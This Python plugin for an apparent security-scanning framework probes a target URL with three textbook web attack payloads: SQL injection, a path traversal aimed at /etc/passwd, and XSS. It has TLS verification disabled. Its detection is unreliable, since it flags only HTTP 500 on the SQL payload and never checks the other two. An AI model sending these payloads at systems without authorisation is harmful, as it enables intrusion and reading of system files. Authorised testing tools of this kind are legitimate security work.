import asyncio
import httpx
from urllib.parse import urljoin

PLUGIN_META = {
    "name": "Offensive Vulnerability Fuzzer",
    "flag": "--vuln-fuzz",
    "description": "Run offensive vulnerability fuzzer (SQLi, LFI, XSS)",
    "category": "offensive"
}

PAYLOADS = [
    ("SQL Injection", "' OR '1'='1"),
    ("Local File Inclusion", "../../../etc/passwd"),
    ("Cross-Site Scripting", "<script>alert(1)</script>")
]

async def run(target_url, reporter=None):
    print(f"[*] Starting Offensive Vulnerability Fuzzing against: {target_url}")
    findings = []
    
    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
        for name, payload in PAYLOADS:
            test_url = f"{target_url}/?s={payload}"
            try:
                resp = await client.get(test_url, timeout=5.0)
                if resp.status_code == 500 and "SQL" in name:
                    desc = f"Potential SQL Injection vulnerability flagged at: {test_url}"
                    print(f"[!] [HIGH] {desc}")
                    findings.append({"url": test_url, "type": name, "severity": "HIGH"})
                    if reporter:
                        reporter.add_finding(module="Vuln Fuzzer", severity="HIGH", description=desc, details={"payload": payload})
            except Exception:
                pass

    print(f"[*] Vulnerability fuzzing completed. Findings: {len(findings)}")
    if reporter:
        reporter.add_section("Vulnerability Fuzzing Analysis", {"findings_count": len(findings), "findings": findings})
